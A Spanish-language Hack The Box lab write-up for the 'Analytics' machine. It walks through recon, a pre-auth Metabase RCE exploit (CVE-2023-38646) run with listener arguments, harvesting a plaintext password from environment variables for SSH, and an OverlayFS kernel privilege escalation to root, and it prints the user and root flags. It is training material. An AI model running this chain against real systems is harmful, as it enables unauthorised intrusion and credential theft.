---
tags:
title: Analytics - Easy (HTB)
permalink: /Analytics-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.229.224
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 00:14 -03
Nmap scan report for analytics.htb (10.129.229.224)
Host is up (0.81s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.92 seconds
```

## Website / Port 80 

La pagina en si, no tiene nada de informacion.

![image-center](/assets/images/{A6998FD8-AF22-4FA2-902C-CA61A7C74B06}.png)
## Shell as metabase
### Login

En el botón de `login` me redirige a un nuevo subdominio.

```bash
data.analytical.htb
```

Por lo que lo agrego al `/etc/hosts` para que mi maquina tenga resolución a ese subdominio.

![image-center](/assets/images/{DA1DA229-1A64-4AF6-A02F-DF7C0A10E40B}.png)
### CVE

Es así como veo un panel de login para `Metabase`.

>`Metabase` es una plataforma de inteligencia empresarial (BI) de código abierto que permite a usuarios sin conocimientos técnicos profundos conectar sus bases de datos, entre muchas otras funciones.

Buscando con `searchsploit` vulnerabilidades o `exploits` para esta plataforma, encuentro 1 solo.

```bash
searchsploit metabase
--------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------
Metabase 0.46.6 - Pre-Auth Remote Code Execution                                                                                                         | linux/webapps/51797.py
--------------------------------------------------------------------------------------------------------------------------------------
```

El mismo como dice en el siguiente [enlace](https://nvd.nist.gov/vuln/detail/CVE-2023-38646) se trata de una `Ejecucion remota de comandos (RCE)`, sin la necesidad de la autenticación.

Lo descargo a mi maquina.

```bash
searchsploit -m linux/webapps/51797.py
```

Lo renombro a otro nombre, y lo ejecuto, para ver los argumentos que tengo q colocar.

```bash
python3 exploit_meta.py   
[*] Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]
usage: exploit_meta.py [-h] -l  -p  -P  -u 
exploit_meta.py: error: the following arguments are required: -l/--lhost, -p/--lport, -P/--sport, -u/--url
```
### Shell

```bash
─# python3 exploit.py -l 10.10.17.19 -p 4444 -P 80 -u http://data.analytical.htb/
[*] Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]
[*] Retriving setup token
[+] Setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[*] Tesing if metabase is vulnerable
[+] Starting http server on port 80
[+] Metabase version seems exploitable
[+] Exploiting the server
metabase_shell > whoami
[-] Error: [Errno 98] Address already in use
```
## Shell as metalytics
### ENV

El error que me dio es debido a que desde mi otra shell tenia mi `listener` preparado, por lo que me di cuenta que el mismo script te proporcionaba la shell.
Ya una vez dentro de la shell, puedo ver que en las variables de entorno tengo un usuario y una `password`.

```bash
metabase_shell > 
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=0252cece4043
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=2
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Las mismas son validas para el login `ssh`.

```bash
ssh metalytics@analytics.htb
<SNIP>
metalytics@analytics:~$ whoami
metalytics
```

```bash
metalytics@analytics:~$ cat user.txt 
d062ef30a6531a43d4cfcfd97f8926e8
```
## Shell as root

Ya dentro como el usuario `metalytics` veo que la versión del `Kernel` es algo vieja.

```bash
metalytics@analytics:~$ uname -a 
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

En este [PoC](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) veo que se trata de una vulnerabilidad en el modulo `OverlayFS`, por lo que en mi shell ya puedo crear el mismo archivo y ejecutarlo para poder ganar acceso como `root`.

```bash
metalytics@analytics:/tmp$ vi ex.sh
metalytics@analytics:/tmp$ chmod +x ex.sh 
metalytics@analytics:/tmp$ ./ex.sh 
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:/tmp# whoami
root
```

```bash
root@analytics:/tmp# cat /root/root.txt 
2f2c2158e4fed1792acff398b5a60b88
```

`~Happy Hacking.`